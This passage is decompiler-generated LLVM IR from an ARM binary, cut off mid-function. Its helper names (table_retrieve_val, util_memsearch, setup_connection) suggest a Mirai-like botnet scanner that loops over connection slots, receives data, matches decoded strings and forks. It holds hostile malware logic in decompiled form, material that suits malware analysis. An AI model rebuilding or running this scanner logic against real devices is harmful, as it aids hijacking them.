  %v8_f5f8 = inttoptr i32 %v7_f5f8 to i8*
  store i8 %v5_f5f8, i8* %v8_f5f8, align 1
  %v0_f5fc.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_f5fc.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb417

bb417:                                            ; preds = %.thread301, %bb416
  %v1_f5fc = phi i1 [ %v1_f5fc.pre, %bb416 ], [ %v2_f5e4, %.thread301 ]
  %v0_f5fc = phi i1 [ %v0_f5fc.pre, %bb416 ], [ false, %.thread301 ]
  %v2_f5fc = xor i1 %v1_f5fc, true
  %v3_f5fc = or i1 %v0_f5fc, %v2_f5fc
  br i1 %v3_f5fc, label %bb411, label %dec_label_pc_f600

dec_label_pc_f600:                                ; preds = %bb417
  %v0_f600 = load i32, i32* @r4, align 4
  %v1_f600 = add i32 %v0_f600, 284
  %v2_f600 = inttoptr i32 %v1_f600 to i8*
  %v3_f600 = load i8, i8* %v2_f600, align 1
  %v4_f600 = zext i8 %v3_f600 to i32
  %v1_f604 = add nuw nsw i32 %v4_f600, 1
  %v1_f608 = urem i32 %v1_f604, 256
  store i32 %v1_f608, i32* %r3.global-to-local, align 4
  %v2_f60c = icmp ugt i32 %v1_f608, 9
  store i1 %v2_f60c, i1* %cpsr_c.global-to-local, align 1
  %v7_f60c = icmp eq i32 %v1_f608, 10
  store i1 %v7_f60c, i1* %cpsr_z.global-to-local, align 1
  %v1_f610 = trunc i32 %v1_f604 to i8
  store i8 %v1_f610, i8* %v2_f600, align 1
  %v0_f614 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f614, label %.thread74, label %dec_label_pc_f624

.thread74:                                        ; preds = %dec_label_pc_f600
  %v1_f614 = load i32, i32* %r3.global-to-local, align 4
  %v2_f614 = add i32 %v1_f614, -10
  store i32 %v2_f614, i32* %r3.global-to-local, align 4
  %v2_f618 = load i32, i32* @r4, align 4
  %v3_f618 = add i32 %v2_f618, 12
  %v4_f618 = inttoptr i32 %v3_f618 to i32*
  store i32 %v2_f614, i32* %v4_f618, align 4
  %v1_f61c = load i32, i32* %r3.global-to-local, align 4
  %v2_f61c = trunc i32 %v1_f61c to i8
  %v3_f61c = load i32, i32* @r4, align 4
  %v4_f61c = add i32 %v3_f61c, 284
  %v5_f61c = inttoptr i32 %v4_f61c to i8*
  store i8 %v2_f61c, i8* %v5_f61c, align 1
  %v0_f620.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f620.pr.pr, label %bb411, label %dec_label_pc_f624

dec_label_pc_f624:                                ; preds = %dec_label_pc_f600, %.thread74
  %v0_f624 = load i32, i32* @r4, align 4
  store i32 %v0_f624, i32* @r0, align 4
  %v0_f628 = call i32 @setup_connection()
  store i32 %v0_f628, i32* %r0.global-to-local, align 4
  br label %bb411

dec_label_pc_f630:                                ; preds = %dec_label_pc_f544
  store i32 %v3_f630, i32* %r0.global-to-local, align 4
  %v3_f634 = udiv i32 %v3_f630, 32
  %v3_f638 = mul nuw nsw i32 %v3_f634, 4
  store i32 %v2_f63c, i32* @lr, align 4
  %v2_f640 = add i32 %v3_f638, %v2_f63c
  store i32 %v2_f640, i32* %r3.global-to-local, align 4
  %v1_f644 = add i32 %v2_f640, -312
  %v2_f644 = inttoptr i32 %v1_f644 to i32*
  %v3_f644 = load i32, i32* %v2_f644, align 4
  %v1_f648 = urem i32 %v3_f630, 32
  store i32 %v1_f648, i32* %r1.global-to-local, align 4
  %v7_f64c = shl i32 1, %v1_f648
  %v8_f64c = or i32 %v3_f644, %v7_f64c
  store i32 %v8_f64c, i32* %r2.global-to-local, align 4
  %v0_f650 = load i32, i32* @r5, align 4
  %v3_f650 = icmp uge i32 %v0_f650, %v3_f630
  store i1 %v3_f650, i1* %cpsr_c.global-to-local, align 1
  %v9_f650 = icmp eq i32 %v0_f650, %v3_f630
  store i1 %v9_f650, i1* %cpsr_z.global-to-local, align 1
  %v5_f654 = icmp slt i32 %v0_f650, %v3_f630
  br i1 %v5_f654, label %bb418, label %bb419

bb418:                                            ; preds = %dec_label_pc_f630
  store i32 %v3_f630, i32* @r5, align 4
  br label %bb419

bb419:                                            ; preds = %dec_label_pc_f630, %bb418
  store i32 %v8_f64c, i32* %v2_f644, align 4
  br label %bb411

dec_label_pc_f660:                                ; preds = %bb411
  store i32 0, i32* @r4, align 4
  store i32 1, i32* %stack_var_-68, align 4
  %v0_f66c = load i32, i32* @r6, align 4
  %v1_f66c = load i32, i32* @r5, align 4
  %v3_f66c = icmp uge i32 %v0_f66c, %v1_f66c
  store i1 %v3_f66c, i1* %cpsr_c.global-to-local, align 1
  %v9_f66c = icmp eq i32 %v0_f66c, %v1_f66c
  store i1 %v9_f66c, i1* %cpsr_z.global-to-local, align 1
  %v5_f670 = icmp slt i32 %v0_f66c, %v1_f66c
  %storemerge157 = select i1 %v5_f670, i32 %v1_f66c, i32 %v0_f66c
  store i32 %v2_f684, i32* %ip.global-to-local, align 4
  store i32 %v2_f688, i32* %r1.global-to-local, align 4
  store i32 %v2_f68c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_f694 = add i32 %storemerge157, 1
  store i32 %v1_f694, i32* %r0.global-to-local, align 4
  %v5_f6a0 = call i32 @__libc_select(i32 %v1_f694, i32 %v2_f688, i32 %v2_f68c, i32 0, i32 %v2_f684)
  %v0_f6a4 = load i32, i32* @r4, align 4
  store i32 %v0_f6a4, i32* %r0.global-to-local, align 4
  %v1_f6a8 = inttoptr i32 %v0_f6a4 to i32*
  %v2_f6a8 = call i32 @__GI_time(i32* %v1_f6a8)
  store i32 %v2_f6a8, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_224b0.142 to i32), i32* @lr, align 4
  %v0_f6b0 = load i32, i32* @r4, align 4
  store i32 %v0_f6b0, i32* %stack_var_-52, align 4
  store i32 %v2_f6a8, i32* @global_var_224b0.142, align 4
  br label %dec_label_pc_f6b8

dec_label_pc_f6b8:                                ; preds = %dec_label_pc_f828, %dec_label_pc_f660
  %v0_f6c4 = phi i32 [ %v1_f82c, %dec_label_pc_f828 ], [ %v0_f6b0, %dec_label_pc_f660 ]
  store i32 ptrtoint (i32* @global_var_24f94.153 to i32), i32* %r0.global-to-local, align 4
  %v3_f6bc = mul i32 %v0_f6c4, 256
  store i32 %v3_f6bc, i32* %r3.global-to-local, align 4
  %v2_f6c0 = load i32, i32* @global_var_24f94.153, align 4
  store i32 %v2_f6c0, i32* %r1.global-to-local, align 4
  %v2_f6c8 = mul i32 %v0_f6c4, 288
  store i32 %v2_f6c8, i32* %r2.global-to-local, align 4
  %v2_f6cc = add i32 %v2_f6c0, %v2_f6c8
  store i32 %v2_f6cc, i32* @r6, align 4
  %v1_f6d0 = add i32 %v2_f6cc, 4
  %v2_f6d0 = inttoptr i32 %v1_f6d0 to i32*
  %v3_f6d0 = load i32, i32* %v2_f6d0, align 4
  store i32 %v3_f6d0, i32* %r0.global-to-local, align 4
  %v2_f6d4 = icmp eq i32 %v3_f6d0, -1
  store i1 %v2_f6d4, i1* %cpsr_c.global-to-local, align 1
  %v7_f6d4 = icmp eq i32 %v3_f6d0, -1
  store i1 %v7_f6d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f6d4, label %dec_label_pc_f828, label %dec_label_pc_f6dc

dec_label_pc_f6dc:                                ; preds = %dec_label_pc_f6b8
  %v3_f6dc = udiv i32 %v3_f6d0, 32
  store i32 %v2_f63c, i32* %r1.global-to-local, align 4
  %v3_f6e4 = mul nuw nsw i32 %v3_f6dc, 4
  store i32 %v3_f6e4, i32* @ip, align 4
  %v2_f6e8 = add i32 %v3_f6e4, %v2_f63c
  store i32 %v2_f6e8, i32* %r2.global-to-local, align 4
  %v1_f6ec = add i32 %v2_f6e8, -312
  %v2_f6ec = inttoptr i32 %v1_f6ec to i32*
  %v3_f6ec = load i32, i32* %v2_f6ec, align 4
  %v1_f6f0 = urem i32 %v3_f6d0, 32
  store i32 %v1_f6f0, i32* %r1.global-to-local, align 4
  %v2_f6f4 = add nsw i32 %v1_f6f0, -1
  %v3_f6f4 = shl i32 1, %v2_f6f4
  %v4_f6f4 = and i32 %v3_f6ec, %v3_f6f4
  %v5_f6f4 = icmp ne i32 %v4_f6f4, 0
  store i1 %v5_f6f4, i1* %cpsr_c.global-to-local, align 1
  %v6_f6f4 = ashr i32 %v3_f6ec, %v1_f6f0
  store i32 %v6_f6f4, i32* %r3.global-to-local, align 4
  %v1_f6f8 = urem i32 %v6_f6f4, 2
  %v2_f6f8 = icmp eq i32 %v1_f6f8, 0
  store i1 %v2_f6f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f6f8, label %dec_label_pc_f700, label %dec_label_pc_10274

dec_label_pc_f700:                                ; preds = %dec_label_pc_f6dc, %dec_label_pc_10318
  %v1_f70c = phi i32 [ %v1_f6f0, %dec_label_pc_f6dc ], [ %v1_f70c.pre, %dec_label_pc_10318 ]
  %v0_f704 = phi i32 [ %v3_f6e4, %dec_label_pc_f6dc ], [ %v0_f704.pre, %dec_label_pc_10318 ]
  store i32 %v2_f63c, i32* @lr, align 4
  %v2_f704 = add i32 %v0_f704, %v2_f63c
  store i32 %v2_f704, i32* %r2.global-to-local, align 4
  %v1_f708 = add i32 %v2_f704, -184
  %v2_f708 = inttoptr i32 %v1_f708 to i32*
  %v3_f708 = load i32, i32* %v2_f708, align 4
  %v2_f70c = add i32 %v1_f70c, -1
  %v3_f70c = shl i32 1, %v2_f70c
  %v4_f70c = and i32 %v3_f708, %v3_f70c
  %v5_f70c = icmp ne i32 %v4_f70c, 0
  store i1 %v5_f70c, i1* %cpsr_c.global-to-local, align 1
  %v6_f70c = ashr i32 %v3_f708, %v1_f70c
  store i32 %v6_f70c, i32* %r3.global-to-local, align 4
  %v1_f710 = urem i32 %v6_f70c, 2
  %v2_f710 = icmp eq i32 %v1_f710, 0
  store i1 %v2_f710, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f710, label %dec_label_pc_f828, label %dec_label_pc_f718.preheader

dec_label_pc_f718.preheader:                      ; preds = %dec_label_pc_f700
  %v0_f718182 = load i32, i32* @r6, align 4
  %v1_f718183 = add i32 %v0_f718182, 12
  %v2_f718184 = inttoptr i32 %v1_f718183 to i32*
  %v3_f718185 = load i32, i32* %v2_f718184, align 4
  store i32 %v3_f718185, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f71c181187 = icmp eq i32 %v3_f718185, 0
  store i1 %v2_f71c181187, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f71c181187, label %dec_label_pc_f828, label %dec_label_pc_f724.lr.ph

dec_label_pc_f718.loopexit:                       ; preds = %dec_label_pc_f878, %dec_label_pc_f964
  %v0_f718 = load i32, i32* @r6, align 4
  %v1_f718 = add i32 %v0_f718, 12
  %v2_f718 = inttoptr i32 %v1_f718 to i32*
  %v3_f718 = load i32, i32* %v2_f718, align 4
  store i32 %v3_f718, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f71c181 = icmp eq i32 %v3_f718, 0
  store i1 %v2_f71c181, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f71c181, label %dec_label_pc_f828, label %dec_label_pc_f724.lr.ph

dec_label_pc_f724.lr.ph:                          ; preds = %dec_label_pc_f718.preheader, %dec_label_pc_f718.loopexit
  %v0_f724235 = phi i32 [ %v0_f718, %dec_label_pc_f718.loopexit ], [ %v0_f718182, %dec_label_pc_f718.preheader ]
  br label %dec_label_pc_f724

dec_label_pc_f724:                                ; preds = %dec_label_pc_f71c.backedge.thread, %dec_label_pc_f71c.backedge, %dec_label_pc_f71c.backedge.thread565, %dec_label_pc_f724.lr.ph
  %v0_10240 = phi i32 [ %v0_f724235, %dec_label_pc_f724.lr.ph ], [ %v0_f724232, %dec_label_pc_f71c.backedge ], [ %v0_f79c, %dec_label_pc_f71c.backedge.thread ], [ %v0_f79c, %dec_label_pc_f71c.backedge.thread565 ]
  %v1_f724 = add i32 %v0_10240, 24
  %v2_f724 = inttoptr i32 %v1_f724 to i32*
  %v3_f724 = load i32, i32* %v2_f724, align 4
  store i32 %v3_f724, i32* @r3, align 4
  %v2_f728 = icmp ugt i32 %v3_f724, 255
  store i1 %v2_f728, i1* %cpsr_c.global-to-local, align 1
  %v7_f728 = icmp eq i32 %v3_f724, 256
  store i1 %v7_f728, i1* %cpsr_z.global-to-local, align 1
  %.pre = add i32 %v0_10240, 28
  store i32 %.pre, i32* @fp, align 4
  br i1 %v7_f728, label %dec_label_pc_10240, label %dec_label_pc_f734

dec_label_pc_f734:                                ; preds = %dec_label_pc_f724, %dec_label_pc_10240
  store i32 %v0_f348, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* %v2_f364, align 4
  %v0_f740 = load i32, i32* @r6, align 4
  %v1_f740 = add i32 %v0_f740, 24
  %v2_f740 = inttoptr i32 %v1_f740 to i32*
  %v3_f740 = load i32, i32* %v2_f740, align 4
  store i32 %v3_f740, i32* %r2.global-to-local, align 4
  %v0_f744 = load i32, i32* @fp, align 4
  %v2_f744 = add i32 %v0_f744, %v3_f740
  store i32 %v2_f744, i32* @r4, align 4
  %v1_f748 = add i32 %v0_f740, 4
  %v2_f748 = inttoptr i32 %v1_f748 to i32*
  %v3_f748 = load i32, i32* %v2_f748, align 4
  store i32 %v3_f748, i32* %r0.global-to-local, align 4
  %v1_f74c = sub i32 256, %v3_f740
  store i32 %v1_f74c, i32* %r2.global-to-local, align 4
  store i32 %v2_f744, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_f758 = call i32 @__libc_recv(i32 %v3_f748, i32 %v2_f744, i32 %v1_f74c, i32 16384)
  store i32 %v4_f758, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f75c = icmp eq i32 %v4_f758, 0
  store i1 %v2_f75c, i1* %cpsr_z.global-to-local, align 1
  %tmp420 = icmp slt i32 %v4_f758, 1
  br i1 %tmp420, label %dec_label_pc_f7d4, label %dec_label_pc_f764

dec_label_pc_f764:                                ; preds = %dec_label_pc_f734
  %v0_f764 = load i32, i32* @r5, align 4
  store i32 %v0_f764, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_f768

dec_label_pc_f768:                                ; preds = %.thread81, %dec_label_pc_f764
  %v3_f774 = phi i32 [ %v1_f778, %.thread81 ], [ %v0_f764, %dec_label_pc_f764 ]
  %v1_f768 = load i32, i32* @r4, align 4
  %v2_f768 = add i32 %v1_f768, %v3_f774
  %v3_f768 = inttoptr i32 %v2_f768 to i8*
  %v4_f768 = load i8, i8* %v3_f768, align 1
  %v6_f768 = zext i8 %v4_f768 to i32
  store i32 %v6_f768, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f76c = icmp eq i8 %v4_f768, 0
  store i1 %v2_f76c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f76c, label %bb421, label %.thread81

bb421:                                            ; preds = %dec_label_pc_f768
  %v2_f770 = add nuw nsw i32 %v6_f768, 65
  store i32 %v2_f770, i32* %r3.global-to-local, align 4
  %v2_f774 = trunc i32 %v2_f770 to i8
  store i8 %v2_f774, i8* %v3_f768, align 1
  %v0_f778.pre = load i32, i32* %r2.global-to-local, align 4
  br label %.thread81

.thread81:                                        ; preds = %dec_label_pc_f768, %bb421
  %v0_f778 = phi i32 [ %v3_f774, %dec_label_pc_f768 ], [ %v0_f778.pre, %bb421 ]
  %v1_f778 = add i32 %v0_f778, 1
  store i32 %v1_f778, i32* %r2.global-to-local, align 4
  %v3_f77c = icmp uge i32 %v1_f778, %v4_f758
  store i1 %v3_f77c, i1* %cpsr_c.global-to-local, align 1
  %v9_f77c = icmp eq i32 %v1_f778, %v4_f758
  store i1 %v9_f77c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_f77c, label %dec_label_pc_f784, label %dec_label_pc_f768

dec_label_pc_f784:                                ; preds = %.thread81, %dec_label_pc_f7d8
  store i32 ptrtoint (i32* @global_var_224b0.142 to i32), i32* @ip, align 4
  %v0_f788 = load i32, i32* @r6, align 4
  %v1_f788 = add i32 %v0_f788, 24
  %v2_f788 = inttoptr i32 %v1_f788 to i32*
  %v3_f788 = load i32, i32* %v2_f788, align 4
  %v2_f78c = load i32, i32* @global_var_224b0.142, align 4
  store i32 %v2_f78c, i32* %r2.global-to-local, align 4
  %v2_f790 = add i32 %v3_f788, %v4_f758
  store i32 %v2_f790, i32* %r3.global-to-local, align 4
  store i32 %v2_f790, i32* %v2_f788, align 4
  %v0_f798 = load i32, i32* %r2.global-to-local, align 4
  %v1_f798 = load i32, i32* @r6, align 4
  %v2_f798 = add i32 %v1_f798, 8
  %v3_f798 = inttoptr i32 %v2_f798 to i32*
  store i32 %v0_f798, i32* %v3_f798, align 4
  br label %dec_label_pc_f79c

dec_label_pc_f79c:                                ; preds = %dec_label_pc_f96c, %dec_label_pc_f784
  %v0_f79c = load i32, i32* @r6, align 4
  %v1_f79c = add i32 %v0_f79c, 12
  %v2_f79c = inttoptr i32 %v1_f79c to i32*
  %v3_f79c = load i32, i32* %v2_f79c, align 4
  store i32 %v3_f79c, i32* %r0.global-to-local, align 4
  %v1_f7a0 = add i32 %v3_f79c, -2
  store i32 %v1_f7a0, i32* @r3, align 4
  %v7_f7a4 = icmp eq i32 %v1_f7a0, 8
  store i1 %v7_f7a4, i1* %cpsr_z.global-to-local, align 1
  %v5_f7a8 = and i32 %v1_f7a0, 1073741824
  %v6_f7a8 = icmp ne i32 %v5_f7a8, 0
  store i1 %v6_f7a8, i1* %cpsr_c.global-to-local, align 1
  switch i32 %v3_f79c, label %dec_label_pc_f71c.backedge [
    i32 2, label %dec_label_pc_fa68
    i32 3, label %dec_label_pc_ffe8
    i32 4, label %dec_label_pc_fe28
    i32 5, label %dec_label_pc_fc0c
    i32 6, label %dec_label_pc_fb38
    i32 7, label %dec_label_pc_ff14
    i32 8, label %dec_label_pc_fce0
    i32 9, label %dec_label_pc_f994
    i32 10, label %dec_label_pc_f840
  ]

dec_label_pc_f7d4:                                ; preds = %dec_label_pc_f734
  br i1 %v2_f75c, label %dec_label_pc_104a4, label %dec_label_pc_f7d8

dec_label_pc_f7d8:                                ; preds = %dec_label_pc_f7d4
  %v3_f7d8 = icmp eq i32 %v4_f758, -1
  store i1 %v3_f7d8, i1* %cpsr_c.global-to-local, align 1
  %v8_f7d8 = icmp eq i32 %v4_f758, -1
  store i1 %v8_f7d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_f7d8, label %dec_label_pc_f7e0, label %dec_label_pc_f784

dec_label_pc_f7e0:                                ; preds = %dec_label_pc_f7d8
  store i32 %v0_f348, i32* %r2.global-to-local, align 4
  %v2_f7e4 = load i32, i32* %v2_f364, align 4
  store i32 %v2_f7e4, i32* %r3.global-to-local, align 4
  %v2_f7e8 = icmp ugt i32 %v2_f7e4, 10
  store i1 %v2_f7e8, i1* %cpsr_c.global-to-local, align 1
  %v7_f7e8 = icmp eq i32 %v2_f7e4, 11
  store i1 %v7_f7e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f7e8, label %dec_label_pc_f828, label %dec_label_pc_f7f0

dec_label_pc_f7f0:                                ; preds = %dec_label_pc_f7e0, %dec_label_pc_104a4
  %v0_f7f0 = load i32, i32* @r6, align 4
  %v1_f7f0 = add i32 %v0_f7f0, 4
  %v2_f7f0 = inttoptr i32 %v1_f7f0 to i32*
  %v3_f7f0 = load i32, i32* %v2_f7f0, align 4
  store i32 %v3_f7f0, i32* %r0.global-to-local, align 4
  %v1_f7f4 = call i32 @__GI___libc_close(i32 %v3_f7f0)
  store i32 %v1_f7f4, i32* %r0.global-to-local, align 4
  %v0_f7f8 = load i32, i32* @r6, align 4
  %v1_f7f8 = add i32 %v0_f7f8, 284
  %v2_f7f8 = inttoptr i32 %v1_f7f8 to i8*
  %v3_f7f8 = load i8, i8* %v2_f7f8, align 1
  %v4_f7f8 = zext i8 %v3_f7f8 to i32
  %v1_f7fc = add nuw nsw i32 %v4_f7f8, 1
  %v1_f800 = urem i32 %v1_f7fc, 256
  store i32 %v1_f800, i32* %r3.global-to-local, align 4
  %v2_f804 = icmp ugt i32 %v1_f800, 8
  store i1 %v2_f804, i1* %cpsr_c.global-to-local, align 1
  %v7_f804 = icmp eq i32 %v1_f800, 9
  store i1 %v7_f804, i1* %cpsr_z.global-to-local, align 1
  %v1_f808 = trunc i32 %v1_f7fc to i8
  store i8 %v1_f808, i8* %v2_f7f8, align 1
  store i32 -1, i32* %r2.global-to-local, align 4
  %v0_f810 = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_f810 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v2_f810 = xor i1 %v1_f810, true
  %v3_f810 = and i1 %v0_f810, %v2_f810
  br i1 %v3_f810, label %bb422, label %.thread313

.thread313:                                       ; preds = %dec_label_pc_f7f0
  %v1_f814309314 = load i32, i32* @r6, align 4
  %v2_f814310315 = add i32 %v1_f814309314, 4
  %v3_f814311316 = inttoptr i32 %v2_f814310315 to i32*
  store i32 -1, i32* %v3_f814311316, align 4
  br label %bb423

bb422:                                            ; preds = %dec_label_pc_f7f0
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_f814305 = load i32, i32* @r6, align 4
  %v2_f814306 = add i32 %v1_f814305, 4
  %v3_f814307 = inttoptr i32 %v2_f814306 to i32*
  store i32 -1, i32* %v3_f814307, align 4
  %v4_f818 = load i32, i32* %r3.global-to-local, align 4
  %v5_f818 = load i32, i32* @r6, align 4
  %v6_f818 = add i32 %v5_f818, 12
  %v7_f818 = inttoptr i32 %v6_f818 to i32*
  store i32 %v4_f818, i32* %v7_f818, align 4
  %v4_f81c = load i32, i32* %r3.global-to-local, align 4
  %v5_f81c = trunc i32 %v4_f81c to i8
  %v6_f81c = load i32, i32* @r6, align 4
  %v7_f81c = add i32 %v6_f81c, 284
  %v8_f81c = inttoptr i32 %v7_f81c to i8*
  store i8 %v5_f81c, i8* %v8_f81c, align 1
  %v0_f820.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_f820.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb423

bb423:                                            ; preds = %.thread313, %bb422
  %v1_f824 = phi i1 [ %v1_f820.pre, %bb422 ], [ %v0_f810, %.thread313 ]
  %v0_f824 = phi i1 [ %v0_f820.pre, %bb422 ], [ %v1_f810, %.thread313 ]
  %v2_f820 = xor i1 %v1_f824, true
  %v3_f820 = or i1 %v0_f824, %v2_f820
  br i1 %v3_f820, label %bb424, label %bb425

bb424:                                            ; preds = %bb423
  %v4_f820 = load i32, i32* @r6, align 4
  store i32 %v4_f820, i32* %r0.global-to-local, align 4
  br label %bb425

bb425:                                            ; preds = %bb423, %bb424
  store i32 63528, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_f820, i32 ptrtoint (i32* @global_var_eb18.205 to i32))
  br label %dec_label_pc_f828

dec_label_pc_f828:                                ; preds = %dec_label_pc_f718.loopexit, %dec_label_pc_f71c.backedge, %dec_label_pc_f718.preheader, %dec_label_pc_f7e0, %dec_label_pc_f700, %dec_label_pc_f6b8, %dec_label_pc_10338, %bb425
  %v3_f828 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_f828, i32* %r3.global-to-local, align 4
  %v1_f82c = add i32 %v3_f828, 1
  store i32 %v1_f82c, i32* @r4, align 4
  %v2_f830 = icmp ugt i32 %v1_f82c, 254
  store i1 %v2_f830, i1* %cpsr_c.global-to-local, align 1
  %v7_f830 = icmp eq i32 %v1_f82c, 255
  store i1 %v7_f830, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_f82c, i32* %stack_var_-52, align 4
  %v7_f838 = icmp slt i32 %v1_f82c, 256
  br i1 %v7_f838, label %dec_label_pc_f6b8, label %dec_label_pc_f034

dec_label_pc_f840:                                ; preds = %dec_label_pc_f79c
  store i32 12, i32* %r0.global-to-local, align 4
  %v1_f844 = call i32 @table_unlock_val(i32 12)
  store i32 %v2_10078, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r0.global-to-local, align 4
  %v3_f854 = call i32 @table_retrieve_val(i32 12, i32* nonnull %stack_var_-60)
  %v3_f858 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f854, i32* %r2.global-to-local, align 4
  %v1_f860 = add i32 %v3_f858, -1
  store i32 %v1_f860, i32* %r3.global-to-local, align 4
  %v0_f864 = load i32, i32* @fp, align 4
  store i32 %v0_f864, i32* %r0.global-to-local, align 4
  %v0_f868 = load i32, i32* @r6, align 4
  %v1_f868 = add i32 %v0_f868, 24
  %v2_f868 = inttoptr i32 %v1_f868 to i32*
  %v3_f868 = load i32, i32* %v2_f868, align 4
  store i32 %v3_f868, i32* %r1.global-to-local, align 4
  %v4_f86c = call i32 @util_memsearch(i32 %v0_f864, i32 %v3_f868, i32 %v3_f854, i32 %v1_f860)
  %v3_f870 = icmp eq i32 %v4_f86c, -1
  store i1 %v3_f870, i1* %cpsr_c.global-to-local, align 1
  %v8_f870 = icmp eq i32 %v4_f86c, -1
  store i1 %v8_f870, i1* %cpsr_z.global-to-local, align 1
  store i32 12, i32* %r0.global-to-local, align 4
  %v1_f87c = call i32 @table_lock_val(i32 12)
  br i1 %v3_f870, label %dec_label_pc_f878, label %dec_label_pc_101d8

dec_label_pc_f878:                                ; preds = %dec_label_pc_f840
  store i32 11, i32* %r0.global-to-local, align 4
  %v1_f884 = call i32 @table_unlock_val(i32 11)
  store i32 %v2_10078, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r0.global-to-local, align 4
  %v3_f894 = call i32 @table_retrieve_val(i32 11, i32* nonnull %stack_var_-60)
  store i32 %v3_f894, i32* %r0.global-to-local, align 4
  %v3_f898 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f894, i32* %r2.global-to-local, align 4
  %v1_f8a0 = add i32 %v3_f898, -1
  store i32 %v1_f8a0, i32* %r3.global-to-local, align 4
  %v0_f8a4 = load i32, i32* @r6, align 4
  %v1_f8a4 = add i32 %v0_f8a4, 24
  %v2_f8a4 = inttoptr i32 %v1_f8a4 to i32*
  %v3_f8a4 = load i32, i32* %v2_f8a4, align 4
  store i32 %v3_f8a4, i32* %r1.global-to-local, align 4
  %v0_f8a8 = load i32, i32* @fp, align 4
  store i32 %v0_f8a8, i32* %r0.global-to-local, align 4
  %v4_f8ac = call i32 @util_memsearch(i32 %v0_f8a8, i32 %v3_f8a4, i32 %v3_f894, i32 %v1_f8a0)
  store i32 %v4_f8ac, i32* @r7, align 4
  store i32 11, i32* %r0.global-to-local, align 4
  %v1_f8b8 = call i32 @table_lock_val(i32 11)
  store i32 %v1_f8b8, i32* %r0.global-to-local, align 4
  %v0_f8bc = load i32, i32* @r7, align 4
  %v2_f8bc = icmp eq i32 %v0_f8bc, -1
  store i1 %v2_f8bc, i1* %cpsr_c.global-to-local, align 1
  %v7_f8bc = icmp eq i32 %v0_f8bc, -1
  store i1 %v7_f8bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f8bc, label %dec_label_pc_f718.loopexit, label %dec_label_pc_f8c4

dec_label_pc_f8c4:                                ; preds = %dec_label_pc_f878
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f8c4 = icmp eq i32 %v0_f8bc, 0
  store i1 %v2_f8c4, i1* %cpsr_z.global-to-local, align 1
  %tmp426 = icmp slt i32 %v0_f8bc, 1
  br i1 %tmp426, label %dec_label_pc_f964, label %dec_label_pc_f8cc

dec_label_pc_f8cc:                                ; preds = %dec_label_pc_f8c4
  %v0_f8cc = load i32, i32* @r6, align 4
  %v1_f8cc = add i32 %v0_f8cc, 20
  %v2_f8cc = inttoptr i32 %v1_f8cc to i16*
  %v3_f8cc = load i16, i16* %v2_f8cc, align 2
  %v4_f8cc = zext i16 %v3_f8cc to i32
  store i32 %v4_f8cc, i32* %r3.global-to-local, align 4
  %v1_f8d0 = add i32 %v0_f8cc, 16
  %v2_f8d0 = inttoptr i32 %v1_f8d0 to i32*
  %v3_f8d0 = load i32, i32* %v2_f8d0, align 4
  store i32 %v3_f8d0, i32* %r2.global-to-local, align 4
  store i32 %v2_f8d4, i32* @lr, align 4
  store i32 %v4_f8cc, i32* %stack_var_-42, align 4
  store i32 %v3_f8d0, i32* %stack_var_-60, align 4
  %v1_f8e0 = inttoptr i32 %v0_f8cc to i32*
  %v2_f8e0 = load i32, i32* %v1_f8e0, align 4
  store i32 %v2_f8e0, i32* @sb, align 4
  %v0_f8e4 = call i32 @__libc_fork()
  store i32 %v0_f8e4, i32* %r0.global-to-local, align 4
  %v7_f8e8 = icmp eq i32 %v0_f8e4, -1
  %.465 = zext i1 %v7_f8e8 to i32
  store i32 %.465, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f8f4 = icmp eq i32 %v0_f8e4, 0
  store i1 %v2_f8f4, i1* %cpsr_z.global-to-local, align 1
  %tmp429 = icmp slt i32 %v0_f8e4, 1
  br i1 %tmp429, label %bb430, label %.thread84

.thread84:                                        ; preds = %dec_label_pc_f8cc
  store i32 1, i32* @sl, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f94c

bb430:                                            ; preds = %dec_label_pc_f8cc
  store i32 %.465, i32* @sl, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f900 = icmp eq i1 %v7_f8e8, false
